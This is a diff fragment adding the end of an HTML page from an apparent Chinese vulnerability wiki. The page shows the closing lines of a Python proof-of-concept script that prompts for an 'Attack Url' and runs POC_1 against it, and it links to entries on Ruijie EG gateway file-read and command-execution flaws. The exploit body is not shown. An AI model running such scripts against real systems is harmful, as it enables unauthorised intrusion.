+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[31m[x] 请求失败:</span><span class="si">{}</span><span class="s2"> </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">title</span><span class="p">()</span>
+    <span class="n">target_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\033</span><span class="s2">[35mPlease input Attack Url</span><span class="se">\n</span><span class="s2">Url   &gt;&gt;&gt; </span><span class="se">\033</span><span class="s2">[0m&quot;</span><span class="p">))</span>
+    <span class="n">POC_1</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
+</code></pre></div>
+<p><img alt="" src="../images/202202110929316.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7%20EG%E6%98%93%E7%BD%91%E5%85%B3%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7%20EG%E6%98%93%E7%BD%91%E5%85%B3%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷 EG易网关 download.php 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%94%90%E6%8D%B7%20EG%E6%98%93%E7%BD%91%E5%85%B3%20branch_passw.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%94%90%E6%8D%B7%20EG%E6%98%93%E7%BD%91%E5%85%B3%20branch_passw.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
+        锐捷 EG易网关 branch_passw.php 远程命令执行
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
